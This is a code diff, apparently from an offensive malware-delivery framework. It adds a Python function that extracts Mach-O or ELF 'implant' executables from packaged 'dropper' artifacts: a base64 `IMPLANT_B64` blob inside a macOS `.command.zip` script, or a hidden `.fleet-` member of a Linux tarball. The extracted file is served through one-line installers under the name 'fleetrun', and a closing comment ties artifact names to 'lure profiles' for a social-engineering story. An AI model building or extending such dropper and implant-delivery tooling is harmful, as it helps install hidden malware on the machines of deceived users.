@@ -9,6 +9,7 @@ from __future__ import annotations
 
 import base64
 import hashlib
+import re
 import secrets
 import string
 import subprocess
@@ -67,6 +68,48 @@ def _read_bin(path: Path) -> bytes:
     except OSError:
         pass
     return b""
+
+
+MACHO_MAGICS = (b"\xcf\xfa\xed\xfe", b"\xce\xfa\xed\xfe", b"\xca\xfe\xba\xbe")
+ELF_MAGIC = b"\x7fELF"
+
+
+def extract_implant_from_artifact(path: Path, os_name: str) -> tuple[bytes, str] | None:
+    """Return (implant_bytes, filename) for the raw executable inside a packaged
+    dropper artifact.
+
+    macOS artifacts are ``.command.zip`` archives whose only member is a shell
+    script with the Mach-O implant embedded as ``IMPLANT_B64``; Linux artifacts
+    are ``.tar.gz`` archives that carry the ELF implant as a hidden member. The
+    one-line installers must serve the executable itself, never the dropper
+    script, otherwise the downloaded "binary" re-runs the dropper recursively.
+    """
+    if os_name == "darwin" and path.name.endswith(".command.zip"):
+        with zipfile.ZipFile(path) as zf:
+            for info in zf.infolist():
+                if not info.filename.endswith(".command"):
+                    continue
+                text = zf.read(info).decode("utf-8", "replace")
+                match = re.search(r"^IMPLANT_B64='([A-Za-z0-9+/=\s]+)'$", text, re.M)
+                if match is None:
+                    return None
+                data = base64.b64decode("".join(match.group(1).split()))
+                if not data.startswith(MACHO_MAGICS):
+                    return None
+                return data, "fleetrun"
+    elif os_name == "linux" and path.name.endswith(".tar.gz"):
+        with tarfile.open(path, "r:gz") as tf:
+            for member in tf.getmembers():
+                if not (member.isfile() and member.name.startswith(".fleet-")):
+                    continue
+                handle = tf.extractfile(member)
+                if handle is None:
+                    return None
+                data = handle.read()
+                if not data.startswith(ELF_MAGIC):
+                    return None
+                return data, "fleetrun"
+    return None
 
 
 # Lure profiles: the artifact names must match the social-engineering story of
